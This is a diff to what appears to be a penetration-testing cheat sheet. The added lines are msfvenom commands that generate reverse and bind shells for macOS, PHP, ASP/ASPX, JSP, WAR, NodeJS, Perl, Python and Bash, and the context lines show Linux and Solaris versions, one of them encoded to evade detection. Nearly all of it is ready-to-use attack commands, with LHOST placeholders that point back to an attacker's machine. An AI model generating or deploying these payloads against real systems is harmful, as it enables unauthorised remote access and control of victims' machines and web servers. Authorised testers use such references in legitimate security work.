@@ -43,9 +43,35 @@ One can also use the -a to specify the architecture or the --platform
 <pre>msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf </pre>
 **SunOS (Solaris)**
 <pre>msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf </pre>
-<pre> </pre>
-<pre> </pre>
-<pre> </pre>
-<pre> </pre>
-<pre> </pre>
-<pre> </pre>
+
+**MAC Payloads**
+---
+**Reverse Shell**
+<pre>msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho </pre>
+**Bind Shell**
+<pre>msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho </pre>
+
+**Web Based Payloads**
+---
+**PHP Reverse Shell**
+<pre>msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php </pre>
+<pre>cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php </pre>
+
+**ASP/x Reverse Shell**
+<pre>msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp</pre>
+<pre>msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx </pre>
+
+**JSP Reverse Shell**
+<pre>msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp </pre>
+**WAR Reverse Shell**
+<pre>msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war </pre>
+**NodeJS Reverse Shell**
+<pre>msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) </pre>
+**Script Language payloads**
+---
+**Perl**
+<pre>msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl </pre>
+**Python**
+<pre>msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py </pre>
+**Bash**
+<pre>msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh </pre>
